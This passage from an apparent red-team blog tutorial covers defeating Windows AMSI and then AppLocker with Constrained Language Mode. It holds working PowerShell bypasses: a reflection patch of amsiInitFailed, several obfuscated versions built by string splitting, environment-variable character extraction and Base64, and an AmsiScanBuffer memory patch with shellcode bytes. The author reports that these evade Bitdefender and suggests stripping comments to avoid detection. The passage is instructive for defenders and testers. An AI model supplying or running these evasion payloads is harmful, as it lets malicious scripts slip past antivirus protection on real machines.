class=\"variable\">$assembly</span> = [<span class=\"type\">Ref</span>].Assembly.GetType((<span class=\"string\">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<p>So what does that mean ?</p>\n<p>In the context of AMSI bypass techniques, obtaining the type information for <code>System.Management.Automation.AmsiUtils</code> is crucial because it allows you to interact with the internal fields and methods of this class, which are not accessible through regular PowerShell commands. By using <span style=\"color:yellow\">reflection</span>, you can access and manipulate private and internal members of the class, such as the <code>amsiInitFailed</code> field.</p>\n<p>But what is reflection ?</p>\n<p>Reflection is a feature in many programming languages, including .NET and Java, that allows a program to inspect and interact with its own structure and behavior at runtime. This includes inspecting types, methods, properties, fields, and other metadata, as well as creating and manipulating objects dynamically. Reflection is particularly powerful because it <span style=\"color:yellow\">allows for more dynamic and flexible code, though it can also introduce complexity and performance overhead</span>.</p>\n<p>Let‚Äôs see an important screenshot</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def1.png\" alt=\"\"></figure>\n\n\n<p>When you see this output, it means that :</p>\n<ol>\n<li>The type <code>AmsiUtils</code> is successfully retrieved from the assembly, indicating that AMSI is present and recognized.</li>\n<li>Since <code>AmsiUtils</code> is not public, it suggests that the class is intended for internal use within the .NET assembly.</li>\n<li>The type inherits from <code>System.Object</code>, which is typical for most classes in .NET</li>\n</ol>\n<ul>\n<li>$field &#x3D; $assembly.GetField((‚Äòam{0}InitFailed‚Äô -f $c),‚ÄôNonPublic,Static‚Äô)</li>\n</ul>\n<p>Let‚Äôs see it in a good way without variables</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$field</span> = [<span class=\"type\">Ref</span>].Assembly.GetType((<span class=\"string\">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>)).GetField(<span class=\"string\">&#x27;amsiInitFailed&#x27;</span>, <span class=\"string\">&#x27;NonPublic,Static&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>This line retrieves the field <code>amsiInitFailed</code> from the <code>AmsiUtils</code> type. The <code>NonPublic</code> and <code>Static</code> flags indicate that it is a non-public (private or protected) static field.</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def2.png\" alt=\"\"></figure>\n\n\n<ul>\n<li>$field.SetValue($null,$true)</li>\n</ul>\n<p>Let‚Äôs see it in a good way without variables</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">[<span class=\"type\">Ref</span>].Assembly.GetType((<span class=\"string\">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>)).GetField(<span class=\"string\">&#x27;amsiInitFailed&#x27;</span>, <span class=\"string\">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class=\"variable\">$null</span>,<span class=\"variable\">$true</span>)</span><br></pre></td></tr></table></figure>\n\n<p>By setting the value of the <code>amsiInitFailed</code> field to <code>true</code>, the script tricks PowerShell into believing that <span style=\"color:yellow\">AMSI failed to initialize properly</span>. As a result, PowerShell skips or disables AMSI‚Äôs scanning functionality.</p>\n<p>Nice now we break it let‚Äôs see bypass the AMSI</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def3.png\" alt=\"\"></figure>\n\n\n<p>We filed! , That‚Äôs okay</p>\n<p><a href=\"https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\">This command is very popular in AMSI bypass</a> so it‚Äôs regular to be detected</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def4.png\" alt=\"\"></figure>\n\n<h3 id=\"Obfuscation\"><a href=\"#Obfuscation\" class=\"headerlink\" title=\"Obfuscation\"></a>Obfuscation</h3><p>Obfuscation in AMSI bypass refers to techniques used to <span style=\"color:yellow\">conceal or disguise the code that performs the AMSI bypass</span>. The purpose is to make the bypass harder to detect by security software and reverse engineers, I will show u some ways that u can use Obfuscation to bypass</p>\n<h4 id=\"String-Splitting-and-Concatenation\"><a href=\"#String-Splitting-and-Concatenation\" class=\"headerlink\" title=\"String Splitting and Concatenation\"></a>String Splitting and Concatenation</h4><p>We tested it before in our last example but let us make it work</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def5.png\" alt=\"\"></figure>\n\n\n<p>Let‚Äôs use <a href=\"https://github.com/RythmStick/AMSITrigger\">AMSITrigger</a> to see why we are blocked from <a href=\"https://www.bitdefender.com/\">Bitdefender</a></p>\n<p>Make an exception for ur dir to test the scripts</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def6.png\" alt=\"\"></figure>\n\n<p>Okay now we know where is the AMSI detect us let‚Äôs see how we can bypass it , We see it from the last example so i don‚Äôt need to explain what i do again</p>\n<p>from</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$ReF</span>=[<span class=\"type\">ReF</span>].AsSemBlY.GEtTypE(<span class=\"string\">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$Ref</span>.GetFIElD(<span class=\"string\">&#x27;amsiInitFailed&#x27;</span>,<span class=\"string\">&#x27;NonPublic,Static&#x27;</span>).SETValue(<span class=\"variable\">$NULl</span>,<span class=\"variable\">$truE</span>);</span><br></pre></td></tr></table></figure>\n\n<p>To</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$w</span> = <span class=\"string\">&#x27;System.Management.Automation.A&#x27;</span>;<span class=\"variable\">$c</span> = <span class=\"string\">&#x27;si&#x27;</span>;<span class=\"variable\">$m</span> = <span class=\"string\">&#x27;Utils&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$assembly</span> = [<span class=\"type\">Ref</span>].Assembly.GetType((<span class=\"string\">&#x27;&#123;0&#125;m&#123;1&#125;&#123;2&#125;&#x27;</span> <span class=\"operator\">-f</span> <span class=\"variable\">$w</span>,<span class=\"variable\">$c</span>,<span class=\"variable\">$m</span>))</span><br><span class=\"line\"><span class=\"variable\">$field</span> = <span class=\"variable\">$assembly</span>.GetField((<span class=\"string\">&#x27;am&#123;0&#125;InitFailed&#x27;</span> <span class=\"operator\">-f</span> </span><br><span class=\"line\"><span class=\"variable\">$c</span>),<span class=\"string\">&#x27;NonPublic,Static&#x27;</span>)</span><br><span class=\"line\"><span class=\"variable\">$field</span>.SetValue(<span class=\"variable\">$null</span>,<span class=\"variable\">$true</span>)</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs see if this work</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def7.png\" alt=\"\"></figure>\n\n<p>The AMSI told us it‚Äôs clean but we are still on the radar , It doesn‚Äôt work again !!</p>\n<p>So i try to use more variables and concatinate them</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$namespace</span> = <span class=\"string\">&#x27;System.Management.Automation&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$classPrefix</span> = <span class=\"string\">&#x27;A&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$propertyName</span> = <span class=\"string\">&#x27;InitFailed&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$visibility</span> = <span class=\"string\">&#x27;NonPublic,Static&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$w</span> = <span class=\"string\">&quot;<span class=\"variable\">$namespace</span>.<span class=\"variable\">$classPrefix</span>&quot;</span> <span class=\"comment\"># System.Management.Automation.A </span></span><br><span class=\"line\"><span class=\"variable\">$c</span> = <span class=\"string\">&#x27;si&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$m</span> = <span class=\"string\">&#x27;Utils&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$fullClassName</span> = <span class=\"string\">&#x27;&#123;0&#125;m&#123;1&#125;&#123;2&#125;&#x27;</span> <span class=\"operator\">-f</span> <span class=\"variable\">$w</span>, <span class=\"variable\">$c</span>, <span class=\"variable\">$m</span> <span class=\"comment\">#System.Management.Automation.AmsiUtils</span></span><br><span class=\"line\"><span class=\"variable\">$assembly</span> = [<span class=\"type\">Ref</span>].Assembly.GetType(<span class=\"variable\">$fullClassName</span>)</span><br><span class=\"line\"><span class=\"variable\">$propertyFullName</span> = <span class=\"string\">&#x27;am&#123;0&#125;&#123;1&#125;&#x27;</span> <span class=\"operator\">-f</span> <span class=\"variable\">$c</span>, <span class=\"variable\">$propertyName</span></span><br><span class=\"line\"><span class=\"variable\">$field</span> = <span class=\"variable\">$assembly</span>.GetField(<span class=\"variable\">$propertyFullName</span>, <span class=\"variable\">$visibility</span>)</span><br><span class=\"line\"><span class=\"variable\">$field</span>.SetValue(<span class=\"variable\">$null</span>, <span class=\"variable\">$true</span>)</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs try to check this out with <a href=\"https://github.com/gatariee/gocheck\">gocheck</a> and see if it works</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def8.png\" alt=\"\"></figure>\n\n<p>It doesn‚Äôt work again, Am‚Ä¶</p>\n<p>At this time I refused to move forward and try to learn other methods and combine them to bypass so I scratched my head and got a good idea</p>\n<p>We can use <span style=\"color:yellow\">environment variables</span> to evade detection by the antivirus , Let‚Äôs craft our script</p>\n<p>So I decided to write a PowerShell script That retrieves all environment variables to search for every word that I entered to get it immediately as a variable you can use it from my GitHub repo from <a href=\"https://github.com/N1NJ10/Bad_Scripts/blob/main/PowerShell/Envrandomizer.ps1\">here</a></p>\n<blockquote>\n<p>The idea behinde this sript come to me after seeing <a href=\"https://www.youtube.com/watch?v=-j7zzUwB_-E&t=414s\">Daniel Bohannon</a> explaining Invoke-CradleCrafter</p>\n</blockquote>\n<p>With this script, i can craft our payload in a new way</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"># Extract characters from system environment variables to form &quot;system&quot;</span><br><span class=\"line\">$s1 = [Environment]::GetEnvironmentVariable(&#x27;DriverData&#x27;)[11]  # &#x27;S&#x27;</span><br><span class=\"line\">$s2 = [Environment]::GetEnvironmentVariable(&quot;COMSPEC&quot;)[12]  # &#x27;y&#x27;</span><br><span class=\"line\">$s3 = [Environment]::GetEnvironmentVariable(&quot;ComSpec&quot;)[9] # &#x27;s&#x27;</span><br><span class=\"line\">$s4 = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[12] # &#x27;t&#x27;</span><br><span class=\"line\">$s5 = [Environment]::GetEnvironmentVariable(&quot;HOMEPATH&quot;)[3]  # &#x27;e&#x27;</span><br><span class=\"line\">$s6 = [Environment]::GetEnvironmentVariable(&quot;ALLUSERSPROFILE&quot;)[9]  # &#x27;m&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">$s = &quot;$s1$s2$s3$s4$s5$s6&quot; # &quot;System&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># Extract characters from system environment variables to form &quot;Management&quot;</span><br><span class=\"line\">$m1 = [Environment]::GetEnvironmentVariable(&quot;PSModulePath&quot;)[137]  # &#x27;M&#x27;</span><br><span class=\"line\">$m2 = [Environment]::GetEnvironmentVariable(&quot;ALLUSERSPROFILE&quot;)[8]  # &#x27;a&#x27;</span><br><span class=\"line\">$m3 = [Environment]::GetEnvironmentVariable(&quot;CommonProgramFiles&quot;)[22]  # &#x27;n&#x27;</span><br><span class=\"line\">$m4 = [Environment]::GetEnvironmentVariable(&quot;ALLUSERSPROFILE&quot;)[8]  # &#x27;a&#x27;</span><br><span class=\"line\">$m5 = [Environment]::GetEnvironmentVariable(&quot;ProgramFiles(x86)&quot;)[6]  # &#x27;g&#x27;</span><br><span class=\"line\">$m6 = [Environment]::GetEnvironmentVariable(&quot;HOMEPATH&quot;)[3]  # &#x27;e&#x27;</span><br><span class=\"line\">$m7 = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[9]  # &#x27;M&#x27;</span><br><span class=\"line\">$m8 = [Environment]::GetEnvironmentVariable(&quot;HOMEPATH&quot;)[3]  # &#x27;e&#x27;</span><br><span class=\"line\">$m9 = [Environment]::GetEnvironmentVariable(&quot;CommonProgramFiles&quot;)[22] # &#x27;n&#x27;</span><br><span class=\"line\">$mx = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[12] # &#x27;t&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">$m = &quot;$m1$m2$m3$m4$m5$m6$m7$m8$m9$mx&quot; # &quot;Management&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># Extract characters from system environment variables to form &quot;Automation&quot;</span><br><span class=\"line\">$a1 = [Environment]::GetEnvironmentVariable(&#x27;APPDATA&#x27;)[15]  # &#x27;A&#x27;</span><br><span class=\"line\">$a2 = [Environment]::GetEnvironmentVariable(&#x27;FPS_BROWSER_USER_PROFILE_STRING&#x27;)[4]  # &#x27;u&#x27;</span><br><span class=\"line\">$a3 = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[12]  # &#x27;t&#x27;</span><br><span class=\"line\">$a4 = [Environment]::GetEnvironmentVariable(&quot;windir&quot;)[7]  # &#x27;o&#x27;</span><br><span class=\"line\">$a5 = [Environment]::GetEnvironmentVariable(&quot;ALLUSERSPROFILE&quot;)[9]  # &#x27;m&#x27;</span><br><span class=\"line\">$a6 = [Environment]::GetEnvironmentVariable(&quot;ALLUSERSPROFILE&quot;)[8]  # &#x27;a&#x27;</span><br><span class=\"line\">$a7 = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[12]  # &#x27;t&#x27;</span><br><span class=\"line\">$a8 = [Environment]::GetEnvironmentVariable(&quot;CommonProgramFiles&quot;)[12]  # &#x27;i&#x27;</span><br><span class=\"line\">$a9 = [Environment]::GetEnvironmentVariable(&quot;windir&quot;)[7]  # &#x27;o&#x27;</span><br><span class=\"line\">$ax = [Environment]::GetEnvironmentVariable(&quot;CommonProgramFiles&quot;)[22]  # &#x27;n&#x27;</span><br><span class=\"line\">$a = &quot;$a1$a2$a3$a4$a5$a6$a7$a8$a9$ax&quot;  # &quot;Automation&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># Extract characters from system environment variables to form &quot;Amsi&quot;</span><br><span class=\"line\">$am0 =  [Environment]::GetEnvironmentVariable(&quot;TEMP&quot;)[4] + [Environment]::GetEnvironmentVariable(&quot;PUBLIC&quot;)[13] # &#x27;si&#x27;</span><br><span class=\"line\">$am1 = [Environment]::GetEnvironmentVariable(&#x27;APPDATA&#x27;)[15]  # &#x27;A&#x27;</span><br><span class=\"line\">$am2 = [Environment]::GetEnvironmentVariable(&quot;TEMP&quot;)[9]  # &#x27;m&#x27;</span><br><span class=\"line\">$am3 = [Environment]::GetEnvironmentVariable(&quot;TEMP&quot;)[4]  # &#x27;s&#x27;</span><br><span class=\"line\">$am4  = [Environment]::GetEnvironmentVariable(&quot;PUBLIC&quot;)[13]  # &#x27;i&#x27;</span><br><span class=\"line\">$am = &quot;$am1$am2$am3$am4&quot;  # &quot;Amsi&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># Extract characters from system environment variables to form &quot;Utils&quot;</span><br><span class=\"line\">$u1 = [Environment]::GetEnvironmentVariable(&quot;PSModulePath&quot;)[3]  # &#x27;U&#x27;</span><br><span class=\"line\">$u2 = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[12]  # &#x27;t&#x27;</span><br><span class=\"line\">$u3 = [Environment]::GetEnvironmentVariable(&quot;PUBLIC&quot;)[13]  # &#x27;i&#x27;</span><br><span class=\"line\">$u4 = [Environment]::GetEnvironmentVariable(&quot;PSModulePath&quot;)[40]  # &#x27;l&#x27;</span><br><span class=\"line\">$u5 = [Environment]::GetEnvironmentVariable(&quot;PSModulePath&quot;)[49]  # &#x27;s&#x27;</span><br><span class=\"line\">$u = &quot;$u1$u2$u3$u4$u5&quot;  # &quot;Utils&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># Construct the type name for AMSI Utils</span><br><span class=\"line\">$typeName = &quot;$s.$m.$a.$am$u&quot;  # &quot;System.Management.Automation.AmsiUtils&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># Get the AMSI Utils type</span><br><span class=\"line\">$assembly = [Ref].Assembly.GetType($typeName)</span><br><span class=\"line\"></span><br><span class=\"line\"># Get the &#x27;amsiInitFailed&#x27; field</span><br><span class=\"line\"></span><br><span class=\"line\">$field = $assembly.GetField((&#x27;am&#123;0&#125;InitFailed&#x27; -f $am0), &#x27;NonPublic,Static&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># Set the &#x27;amsiInitFailed&#x27; field to true</span><br><span class=\"line\">$field.SetValue($null, $true)</span><br></pre></td></tr></table></figure>\n\n<p>That‚Äôs nice let‚Äôs try it</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def9.png\" alt=\"\"></figure>\n\n<blockquote>\n<p><strong>Remove the comments</strong> to avoid detecting i just put them for u to understand what I do<br>{: .prompt-tip }</p>\n</blockquote>\n<p>Bypassed ! , Yeah we did it together mate be creative in ur thoughts and u will see magic , Let‚Äôs see other methods</p>\n<blockquote>\n<p>Bypassing AMSI does not necessarily bypass all antivirus protections. Modern antivirus solutions employ multiple layers of defense, including behavioral analysis and heuristics, which can still detect and block malicious activities even if AMSI is bypassed.<br>{: .prompt-info }</p>\n</blockquote>\n<h4 id=\"Base64-Encoding\"><a href=\"#Base64-Encoding\" class=\"headerlink\" title=\"Base64 Encoding\"></a>Base64 Encoding</h4><p>Of course, encoding will get into the game, Let‚Äôs see how to use it</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$command</span> = <span class=\"string\">&#x27;hostname&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$bytes</span> = [<span class=\"type\">System.Text.Encoding</span>]::Unicode.GetBytes(<span class=\"variable\">$command</span>)</span><br><span class=\"line\"><span class=\"variable\">$encodedCommand</span> = [<span class=\"type\">Convert</span>]::ToBase64String(<span class=\"variable\">$bytes</span>)</span><br><span class=\"line\"><span class=\"built_in\">Write-Output</span> <span class=\"variable\">$encodedCommand</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$decodedBytes</span> = [<span class=\"type\">Convert</span>]::FromBase64String(<span class=\"variable\">$encodedCommand</span>)</span><br><span class=\"line\"><span class=\"variable\">$decodedCommand</span> = [<span class=\"type\">System.Text.Encoding</span>]::Unicode.GetString(<span class=\"variable\">$decodedBytes</span>)</span><br><span class=\"line\"><span class=\"built_in\">Invoke-Expression</span> <span class=\"variable\">$decodedCommand</span></span><br></pre></td></tr></table></figure>\n\n<p>This example takes a command [ hostname ] and encodes it to base64 then decodes and execute it this is the same method that we will be using</p>\n<blockquote>\n<p><a href=\"https://stackoverflow.com/questions/3538021/why-do-we-use-base64\">Why do we use bytes no encode and decode directly ?</a></p>\n<p>This is necessary because Base64 operates on byte data. Strings are sequences of characters, which must be converted to bytes for Base64 encoding.<br>{: .prompt-info }</p>\n</blockquote>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def10.png\" alt=\"\"></figure>\n\n\n<p>Let‚Äôs see how to use it in our script</p>\n<p>from</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$ReF</span>=[<span class=\"type\">ReF</span>].AsSemBlY.GEtTypE(<span class=\"string\">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$Ref</span>.GetFIElD(<span class=\"string\">&#x27;amsiInitFailed&#x27;</span>,<span class=\"string\">&#x27;NonPublic,Static&#x27;</span>).SETValue(<span class=\"variable\">$NULl</span>,<span class=\"variable\">$truE</span>);</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/\">To</a></p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">[<span class=\"type\">Ref</span>].Assembly.GetType(<span class=\"string\">&#x27;System.Management.Automation.&#x27;</span>+<span class=\"variable\">$</span>([<span class=\"type\">Text.Encoding</span>]::Unicode.GetString([<span class=\"type\">Convert</span>]::FromBase64String(<span class=\"string\">&#x27;QQBtAHMAaQBVAHQAaQBsAHMA&#x27;</span>)))).GetField(<span class=\"variable\">$</span>([<span class=\"type\">Text.Encoding</span>]::Unicode.GetString([<span class=\"type\">Convert</span>]::FromBase64String(<span class=\"string\">&#x27;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&#x27;</span>))),<span class=\"string\">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class=\"variable\">$null</span>,<span class=\"variable\">$true</span>)</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs see if this work</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def11.png\" alt=\"\"></figure>\n\n<p>Again we bypassed the AMSI with the Base64-encoded payload</p>\n<p>There is many obfuscation methods left , I will leave u some resources at the end of the post to check them out and try to make one of them work with u consider it as a task</p>\n<h3 id=\"Memory-Patch\"><a href=\"#Memory-Patch\" class=\"headerlink\" title=\"Memory Patch\"></a>Memory Patch</h3><p>The idea behind this bypass is to force <span style=\"color:yellow\">AmsiScanBuffer to return AMSI_RESULT_CLEAN</span>. The general idea is to import API calls and then return a specific value to the AmsiScanBuffer() call: 0x80070057. The original bypass is detected by AMSI now, so we can manipulate with assembly instructions by using a double add operand and successfully bypass the control. The code for this is as follows:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$Win32</span> = <span class=\"string\">@&quot;</span></span><br><span class=\"line\"><span class=\"string\">using System;</span></span><br><span class=\"line\"><span class=\"string\">using System.Runtime.InteropServices;</span></span><br><span class=\"line\"><span class=\"string\">public class Win32 &#123;</span></span><br><span class=\"line\"><span class=\"string\">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class=\"line\"><span class=\"string\">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><br><span class=\"line\"><span class=\"string\">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class=\"line\"><span class=\"string\">    public static extern IntPtr LoadLibrary(string name);</span></span><br><span class=\"line\"><span class=\"string\">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class=\"line\"><span class=\"string\">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">&quot;@</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Add-Type</span> <span class=\"variable\">$Win32</span></span><br><span class=\"line\"><span class=\"variable\">$test</span> = [<span class=\"built_in\">Byte</span>[]](<span class=\"number\">0</span>x61, <span class=\"number\">0</span>x6d, <span class=\"number\">0</span>x73, <span class=\"number\">0</span>x69, <span class=\"number\">0</span>x2e, <span class=\"number\">0</span>x64, <span class=\"number\">0</span>x6c, <span class=\"number\">0</span>x6c)</span><br><span class=\"line\"><span class=\"variable\">$LoadLibrary</span> = [<span class=\"type\">Win32</span>]::LoadLibrary([<span class=\"type\">System.Text.Encoding</span>]::ASCII.GetString(<span class=\"variable\">$test</span>))</span><br><span class=\"line\"><span class=\"variable\">$test2</span> = [<span class=\"built_in\">Byte</span>[]] (<span class=\"number\">0</span>x41, <span class=\"number\">0</span>x6d, <span class=\"number\">0</span>x73, <span class=\"number\">0</span>x69, <span class=\"number\">0</span>x53, <span class=\"number\">0</span>x63, <span class=\"number\">0</span>x61, <span class=\"number\">0</span>x6e, <span class=\"number\">0</span>x42, <span class=\"number\">0</span>x75, <span class=\"number\">0</span>x66, <span class=\"number\">0</span>x66, <span class=\"number\">0</span>x65, <span class=\"number\">0</span>x72)</span><br><span class=\"line\"><span class=\"variable\">$Address</span> = [<span class=\"type\">Win32</span>]::GetProcAddress(<span class=\"variable\">$LoadLibrary</span>, [<span class=\"type\">System.Text.Encoding</span>]::ASCII.GetString(<span class=\"variable\">$test2</span>))</span><br><span class=\"line\"><span class=\"variable\">$p</span> = <span class=\"number\">0</span></span><br><span class=\"line\">[<span class=\"type\">Win32</span>]::VirtualProtect(<span class=\"variable\">$Address</span>, [<span class=\"type\">uint32</span>]<span class=\"number\">5</span>, <span class=\"number\">0</span>x40, [<span class=\"type\">ref</span>]<span class=\"variable\">$p</span>)</span><br><span class=\"line\"><span class=\"variable\">$Patch</span> = [<span class=\"built_in\">Byte</span>[]] (<span class=\"number\">0</span>x31, <span class=\"number\">0</span>xC0, <span class=\"number\">0</span>x05, <span class=\"number\">0</span>x78, <span class=\"number\">0</span>x01, <span class=\"number\">0</span>x19, <span class=\"number\">0</span>x7F, <span class=\"number\">0</span>x05, <span class=\"number\">0</span>xDF, <span class=\"number\">0</span>xFE, <span class=\"number\">0</span>xED, <span class=\"number\">0</span>x00, <span class=\"number\">0</span>xC3)</span><br><span class=\"line\"><span class=\"comment\">#0:  31 c0                   xor    eax,eax</span></span><br><span class=\"line\"><span class=\"comment\">#2:  05 78 01 19 7f          add    eax,0x7f190178</span></span><br><span class=\"line\"><span class=\"comment\">#7:  05 df fe ed 00          add    eax,0xedfedf</span></span><br><span class=\"line\"><span class=\"comment\">#c:  c3                      ret </span></span><br><span class=\"line\">[<span class=\"type\">System.Runtime.InteropServices.Marshal</span>]::<span class=\"built_in\">Copy</span>(<span class=\"variable\">$Patch</span>, <span class=\"number\">0</span>, <span class=\"variable\">$Address</span>, <span class=\"variable\">$Patch</span>.Length)</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs try it</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def12.png\" alt=\"\"></figure>\n\n<p>Again we bypassed the AMSI</p>\n<blockquote>\n<p>If u wanna deep dive into this u can write this <a href=\"https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b\">writeup</a><br>{: .prompt-tip }</p>\n</blockquote>\n<h2 id=\"AppLocker-and-Powershell-CLM\"><a href=\"#AppLocker-and-Powershell-CLM\" class=\"headerlink\" title=\"AppLocker and Powershell CLM\"></a>AppLocker and Powershell CLM</h2><p>Applocker is a white-listing solution With this feature, you can limit not only applications, but also scripts, batches, DLLs, and more. There are a few ways that a limit can be applied: <strong>by Name, Path, Publisher, or Hash</strong> , you can use rules to enforce it to Allow and deny as I will show you</p>\n<p>PowerShell Constrained Language Mode [ CLM ] is a <a href=\"https://devblogs.microsoft.com/powershell/a-comparison-of-shell-and-scripting-language-security/\">language mode</a> of PowerShell designed to support day-to-day administrative tasks, yet restrict access to sensitive language elements that can be used to invoke arbitrary Windows APIs , So why this for ?</p>\n<p>Because it‚Äôs an incredibly effective way to drastically reduce the risk of viruses, ransomware, and unapproved software. For DeviceGuard UMCI the approved applications are determined via a UMCI policy. PowerShell automatically detects when a UMCI policy is being enforced on a system and will run only in Constrained Language mode. So PowerShell Constrained Language mode becomes more interesting when working in conjunction with system-wide lockdown policies.</p>\n<blockquote>\n<p>Local Account Syntax: The general syntax for logging in with a local account is <code>.\\username</code><br>{: .prompt-tip }</p>\n</blockquote>\n<p>Now we know what is Applocker &amp; PowerShell Constrained Language Mode let‚Äôs see how to use them, I need you to follow this <a href=\"https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/\">guide</a></p>\n<p>Let‚Äôs setup our enviroment :</p>\n<p>First we need to configure the Applocker policy from LocalGroupPolicy -&gt; Computer Configration -&gt; Windows Settings -&gt; Security Settings -&gt; Application Control Policies -&gt; AppLocker</p>\n<p>Then i need you to follow the pervious blog and create 2 rules :</p>\n<ul>\n<li>Rule Path to run only executables from the C:\\Windows*</li>\n<li>block the <a href=\"https://github.com/int0x33/nc.exe/blob/master/nc64.exe\">nc64.exe</a> by the hash</li>\n</ul>\n<p>Then generate the default creds for the Script Rules to apply the Constrained Language Mode</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def13.png\" alt=\"\"></figure>\n\n\n<p>If you follow the rules you should see something like this !</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def15.png\" alt=\"\"></figure>\n\n<blockquote>\n<p>This is from <a href=\"https://patchmypc.com/blog/windows-11-24h2-applocker-powershell-constrained-language-broken/\">Rudy Ooms</a> :</p>\n<p>But How PowerShell Determines Language Mode Based on AppLocker Script Rules ??</p>\n<p>When PowerShell starts, it checks whether <a href=\"https://call4cloud.nl/deploying-applocker-intune-powershell/\">AppLocker Script Enforcement</a> Rules are present. It does this by simulating the execution of a test PowerShell script placed in the user‚Äôs temporary folder and evaluating it against the system‚Äôs policies. As shown below, the DLL (System.Management.Automation.dll) responsible for PowerShell shows this behavior.</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def16.png\" alt=\"\"></figure>\nThis means that if AppLocker‚Äôs rules block or restrict the test PS1 file, PowerShell automatically switches into Constrained Language Mode.\n<figure><img src=\"/images/site/posts/DefenseEvasion/def17.png\" alt=\"\"></figure>\nIf no restrictions apply, PowerShell Scripts will be executed in full language mode. This automatic detection has worked reliably for years and has been a simple way to enforce script safety without needing extra configuration inside PowerShell itself.<p>{: .prompt-tip }</p>\n</blockquote>\n<p>But is this a good security approach , It depends on the quality of the rules we are implementing</p>\n<p>Can you disable the Applocker ? ( <strong>Matio here is an administrator</strong> )</p>\n<p>For the first look you can say yes if we are an administrators but seems it doesn‚Äôt work like this</p>\n<p>Let‚Äôs first talk about the PPL (Protected Process Light) : The PLL is a security feature in Windows that protects critical system processes like antivirus engines, security services, and system integrity components from being <strong>tampered with</strong>, even by <strong>administrators or SYSTEM-level accounts</strong>.</p>\n<p>So Let‚Äôs try to disable the AppLocker</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def18.png\" alt=\"\"></figure>\n\n<p>Even with the System account</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def19.png\" alt=\"\"></figure>\n\n<blockquote>\n<p>By the way  <a 